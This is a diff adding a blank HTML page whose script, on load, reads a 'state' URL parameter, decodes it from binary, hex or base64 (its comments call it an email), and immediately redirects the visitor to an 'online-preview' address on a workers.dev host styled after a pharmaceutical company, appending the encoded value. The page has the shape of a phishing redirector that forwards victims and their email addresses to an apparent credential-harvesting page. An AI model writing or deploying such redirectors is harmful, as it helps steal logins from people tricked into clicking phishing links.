@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title></title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+  </head>
+  <body>
+    <script>
+      // --- Utility functions ---
+      function isBinaryString(s) {
+        return /^[01]+$/.test(s) && s.length % 8 === 0;
+      }
+
+      function isHexString(s) {
+        return /^[0-9a-fA-F]+$/.test(s) && s.length % 2 === 0;
+      }
+
+      function looksLikeBase64(s) {
+        return s.length >= 4 && /^[A-Za-z0-9+/]+={0,2}$/.test(s);
+      }
+
+      function binaryToString(bin) {
+        bin = bin.replace(/\s+/g, '');
+        const bytes = bin.match(/.{1,8}/g) || [];
+        return bytes.map(b => String.fromCharCode(parseInt(b, 2))).join('');
+      }
+
+      function hexToString(hex) {
+        hex = hex.replace(/\s+/g, '').replace(/^0x/i, '');
+        const pairs = hex.match(/.{1,2}/g) || [];
+        return pairs.map(p => String.fromCharCode(parseInt(p, 16))).join('');
+      }
+
+      function base64ToString(b64) {
+        try {
+          const binary = atob(b64);
+          let pct = '';
+          for (let i = 0; i < binary.length; i++) {
+            pct += '%' + ('00' + binary.charCodeAt(i).toString(16)).slice(-2);
+          }
+          return decodeURIComponent(pct);
+        } catch (e) {
+          return atob(b64);
+        }
+      }
+
+      function getParameterByName(name) {
+        const url = new URL(window.location.href);
+        return url.searchParams.get(name);
+      }
+
+      // --- Main redirect logic ---
+      function redirectPage() {
+        const data2 = getParameterByName('state');
+        let decoded = data2 || '';
+        let method = 'plain';
+
+        if (data2) {
+          try {
+            if (isBinaryString(data2)) {
+              decoded = binaryToString(data2);
+              method = 'binary';
+            } else if (isHexString(data2)) {
+              decoded = hexToString(data2);
+              method = 'hex';
+            } else if (looksLikeBase64(data2)) {
+              decoded = base64ToString(data2);
+              method = 'base64';
+            } else {
+              decoded = decodeURIComponent(data2);
+              method = 'plain';
+            }
+          } catch (e) {
+            decoded = data2;
+            method = 'plain';
+          }
+
+          // --- Re-encode decoded email into Base64 ---
+          const reEncodedEmail = btoa(decoded);
+
+          // --- Redirect with Base64 email as hash ---
+          window.location.href = "https://online-preview.mountviewpharmaceutical.workers.dev/6ed8e7d40f56/gs/" + data2;
+        } else {
+          window.location.href = "https://online-preview.mountviewpharmaceutical.workers.dev/6ed8e7d40f56/gs/";
+        }
+      }
+
+      redirectPage();
+    </script>
+  </body>
+</html>
